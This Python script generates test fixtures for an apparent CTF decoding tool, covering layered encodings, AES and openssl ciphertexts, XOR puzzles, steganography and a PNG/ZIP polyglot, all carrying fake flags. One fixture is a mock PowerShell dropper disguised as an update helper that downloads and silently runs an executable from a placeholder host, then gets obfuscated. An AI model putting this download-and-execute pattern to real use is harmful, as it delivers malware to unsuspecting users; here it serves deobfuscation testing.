"""Generate the test fixtures in tests/fixtures/ (run: make fixtures).

Every fixture mirrors a real challenge shape, built with known keys and fake flags.
The output is deterministic (fixed seed), so re-running it changes nothing.
Never put real challenge flags here.
"""

from __future__ import annotations

import base64
import hashlib
import io
import random
import struct
import zipfile
import zlib
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

FIXTURES = Path(__file__).parent / "fixtures"
RNG = random.Random(1337)  # fixed seed: same bytes every time


def write(name: str, data: bytes | str) -> None:
    path = FIXTURES / name
    path.write_bytes(data.encode("utf-8") if isinstance(data, str) else data)
    print(f"  {name:32} {path.stat().st_size} bytes")


def evp_bytes_to_key(
    password: bytes, salt: bytes, key_len: int, iv_len: int
) -> tuple[bytes, bytes]:
    """openssl's legacy KDF (MD5, 1 iteration): D_i = MD5(D_{i-1} || password || salt)."""
    derived = b""
    block = b""
    while len(derived) < key_len + iv_len:
        block = hashlib.md5(block + password + salt).digest()
        derived += block
    return derived[:key_len], derived[key_len : key_len + iv_len]


def tiny_png() -> bytes:
    """A valid 1x1 black PNG, built by hand (signature + IHDR + IDAT + IEND)."""

    def chunk(kind: bytes, body: bytes) -> bytes:
        crc = zlib.crc32(kind + body)
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", crc)

    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
    idat = zlib.compress(b"\x00\x00")
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def small_zip(name: str, content: bytes) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        info = zipfile.ZipInfo(name, date_time=(2024, 1, 1, 0, 0, 0))
        info.compress_type = zipfile.ZIP_DEFLATED  # ZipInfo defaults to "stored"
        archive.writestr(info, content)
    return buffer.getvalue()


def hide_zero_width(cover: str, secret: bytes) -> str:
    """Hide `secret` as bits: U+200B = 0, U+200C = 1, inserted after the first word."""
    bits = "".join(f"{byte:08b}" for byte in secret)
    hidden = "".join("​" if bit == "0" else "‌" for bit in bits)
    first, rest = cover.split(" ", 1)
    return first + hidden + " " + rest


ENGLISH = (
    "This is a secret message for the team. The meeting is moved to Friday night, "
    "bring the usual equipment and do not talk about it on the phone. "
    "Remember that the password for the server is written on the back of the old "
    "notebook. When you read this, the flag is CYBN{fixture_xor_repeating}. "
)


def xor(data: bytes, key: bytes) -> bytes:
    """Repeating-key XOR (written here independently of ctfc, to test it)."""
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))


def powershell_dropper() -> str:
    """A fake PowerShell dropper whose strings are hidden with a single-byte XOR (0x5A)."""

    def hidden(text: str) -> str:
        return ",".join(f"0x{ord(char) ^ 0x5A:02x}" for char in text)

    url = "http://update.example.invalid/payload.exe"
    flag = "CYBN{fixture_powershell_layers}"
    return (
        "# Windows update helper - do not remove\n"
        "$k = 0x5A\n"
        "function Decode-String($bytes) {\n"
        "    return -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
        "}\n"
        f"$url = Decode-String @({hidden(url)})\n"
        f"$tag = Decode-String @({hidden(flag)})\n"
        "$client = New-Object System.Net.WebClient\n"
        '$path = Join-Path $env:TEMP "update.exe"\n'
        "$client.DownloadFile($url, $path)\n"
        "Start-Process -FilePath $path -WindowStyle Hidden\n"
        'Write-Output "Update finished, please restart the computer when you can."\n'
    )


def main() -> None:
    FIXTURES.mkdir(exist_ok=True)
    print(f"writing fixtures to {FIXTURES}")

    # Multi-layer encoding: text -> hex -> zlib -> base64
    text = b"Good job, the flag is CYBN{fixture_layers_b64_zlib_hex}"
    write("layers_b64_zlib_hex.txt", base64.b64encode(zlib.compress(text.hex().encode())))

    # Reversed base64 (PowerShell droppers love this)
    write("reversed_b64.txt", base64.b64encode(b"CYBN{fixture_reversed}")[::-1])

    # PowerShell -EncodedCommand: base64 of UTF-16LE
    command = "Write-Host 'CYBN{fixture_encodedcommand}'"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
    write("powershell_encoded.txt", f"powershell.exe -NoP -W Hidden -enc {encoded}\n")

    # AES-ECB with repeated plaintext blocks
    key = RNG.randbytes(16)
    plaintext = b"YELLOW SUBMARINE" * 4 + b"CYBN{fixture_ecb_mode_leaks}"
    write("aes_ecb_repeated.bin", AES.new(key, AES.MODE_ECB).encrypt(pad(plaintext, 16)))

    # openssl enc -aes-256-cbc -md md5 (legacy KDF), raw and base64 versions
    salt = RNG.randbytes(8)
    key, iv = evp_bytes_to_key(b"password123", salt, 32, 16)
    secret = b"CYBN{fixture_openssl_md5}\n"
    blob = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16))
    write("openssl_salted_md5.bin", blob)
    write("openssl_salted_md5.b64", base64.b64encode(blob) + b"\n")

    # PNG with a ZIP appended after IEND (polyglot)
    archive = small_zip("flag.txt", b"CYBN{fixture_polyglot_zip}")
    write("png_with_zip.png", tiny_png() + archive)

    # Zero-width steganography in normal text
    cover = "Nothing to see here, just a normal sentence about the weather."
    write("zero_width.txt", hide_zero_width(cover, b"CYBN{zero_width}"))

    # Binary with crypto constants: TEA delta (LE) and the AES S-box
    sbox_start = bytes.fromhex("637c777bf26b6fc53001672bfed7ab76")
    binary = RNG.randbytes(300) + struct.pack("<I", 0x9E3779B9) + RNG.randbytes(200)
    write("crypto_constants.bin", binary + sbox_start + RNG.randbytes(100))

    # Repeating-key XOR of English text (key length 6)
    xor_key = b"x0rK3y"
    xored = bytes(byte ^ xor_key[i % len(xor_key)] for i, byte in enumerate(ENGLISH.encode()))
    write("xor_repeating.bin", xored)

    # --- XOR (M2) ---
    write("xor_single_byte.bin", xor(ENGLISH.encode(), b"\x5a"))
    # Two layers: repeating key "secret", then the single byte 0x42
    write("xor_two_layers.bin", xor(xor(ENGLISH.encode(), b"secret"), b"\x42"))
    # A PNG file XORed with a 4-byte key: the PNG header is the known plaintext
    write("xor_png.bin", xor(tiny_png() + RNG.randbytes(64), b"k3y!"))
    # Multi-layer: text -> XOR -> zlib -> base64 (decode: base64, zlib, XOR)
    layered = xor(ENGLISH.replace("xor_repeating", "multi_layer").encode(), b"K3y!")
    write("layers_b64_zlib_xor.txt", base64.b64encode(zlib.compress(layered)) + b"\n")
    # PowerShell dropper: strings XORed with 0x5A inside, whole script XORed
    # with a repeating key, then base64
    script = powershell_dropper().encode()
    write("powershell_xor.b64", base64.b64encode(xor(script, b"Upd4t3r!")) + b"\n")
    # Two messages encrypted with the same key stream (two-time pad)
    stream = RNG.randbytes(80)
    write(
        "two_time_pad_1.bin", xor(b"Meet the courier at the train station tonight at nine.", stream)
    )
    write("two_time_pad_2.bin", xor(b"The password for the archive is written on the map.", stream))
    # Too short for statistics: only the crib "CYBN{" can break it (key length 5)
    short = b"Here is what you wanted: CYBN{crib_dragging_works} bye"
    write("xor_short_crib.bin", xor(short, b"Qx7#9"))

    # 48-byte key||iv blob (AES-256-CBC), base64 encoded
    write("key_iv_blob.b64", base64.b64encode(RNG.randbytes(48)) + b"\n")

    # Text formats recognised by prefix
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=")
    payload = base64.urlsafe_b64encode(b'{"user":"admin"}').rstrip(b"=")
    write("jwt.txt", header + b"." + payload + b".c2lnbmF0dXJl\n")
    salt_hex = RNG.randbytes(20).hex()
    response_hex = RNG.randbytes(20).hex()
    write("mysqlna_hash.txt", f"$mysqlna${salt_hex}*{response_hex}\n")


if __name__ == "__main__":
    main()
